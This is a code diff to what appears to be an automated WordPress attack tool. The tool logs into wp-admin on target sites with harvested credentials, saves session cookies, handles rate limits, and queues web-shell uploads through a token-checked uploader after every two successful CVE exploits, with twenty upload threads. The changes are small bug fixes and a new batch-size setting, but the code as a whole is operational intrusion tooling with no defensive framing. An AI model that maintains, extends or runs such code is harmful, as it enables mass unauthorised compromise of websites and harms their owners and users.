@@ -227,6 +227,7 @@ HEALTH_CHECK_URL = "https://www.google.com/generate_204"
 # --- Shell Upload Wave Orchestration ---
 VULN_TARGETS_FOR_SHELL_UPLOAD: List[Dict] = []
 VULN_COUNTER_FOR_SHELL_UPLOAD = 2 # Trigger shell upload very aggressively (every 2 successful CVEs)
+SHELL_UPLOAD_BATCH_SIZE = 2 # Batch size threshold to trigger shell upload wave
 SHELL_UPLOAD_QUEUE: Queue = Queue()
 SHELL_UPLOAD_WORKER_THREADS = 20 # Increased concurrent shell upload processes (can be very resource intensive)
 SHELL_UPLOAD_TIMEOUT = 180 # Increased timeout for full shell upload workflow
@@ -1176,12 +1177,12 @@ def wp_admin_login_for_shell(site: str, username: str, password: str) -> Optiona
                 save_cookies_js(s, site, username, password)
                 return s
             elif "incorrect username or password" in body or "error" in body or "password salah" in body:
-                console.print(f"    [dim yellow]  Login attempt failed for {user} at {login_url}.[/dim yellow]")
+                console.print(f"    [dim yellow]  Login attempt failed for {username} at {login_url}.[/dim yellow]")
             elif "too many login attempts" in body or r_post.status_code == 429:
-                console.print(f"    [dim yellow]  Login rate limited for {user} at {login_url}.[/dim yellow]")
+                console.print(f"    [dim yellow]  Login rate limited for {username} at {login_url}.[/dim yellow]")
                 time.sleep(RETRY_DELAY * 2)
         except requests.exceptions.RequestException as e:
-            console.print(f"    [dim red]  Login attempt failed with exception for {user} at {login_url}: {e}. Resetting session.[/dim red]")
+            console.print(f"    [dim red]  Login attempt failed with exception for {username} at {login_url}: {e}. Resetting session.[/dim red]")
             _thread_local.session = None
             continue
     
@@ -1191,10 +1192,10 @@ def wp_admin_login_for_shell(site: str, username: str, password: str) -> Optiona
         try:
             rv = _get_session().get(f"{site}/wp-admin/", timeout=TIMEOUT, allow_redirects=True)
             if "wp-admin" in rv.url and "wp-login" not in rv.url:
-                console.print(f"    [dim green]  Restored session for {user} is active.[/dim green]")
+                console.print(f"    [dim green]  Restored session for {username} is active.[/dim green]")
                 return _get_session()
         except requests.exceptions.RequestException:
-            console.print(f"    [dim yellow]  Restored session for {user} failed to verify.[/dim yellow]")
+            console.print(f"    [dim yellow]  Restored session for {username} failed to verify.[/dim yellow]")
             pass
 
     return None
@@ -1205,7 +1206,7 @@ def _upload_shell_via_uploader(uploader_url: str, session: requests.Session, cve
 
     try:
         r = session.get(f"{uploader_url}?p={cve_secret_token}", timeout=15)
-        if cve_secret_token not in (r.text or ""):\
+        if cve_secret_token not in (r.text or ""):
             console.print(f"    [dim yellow]  Uploader at {uploader_url} not responding with correct secret. Skipping.[/dim yellow]")
             return None
 
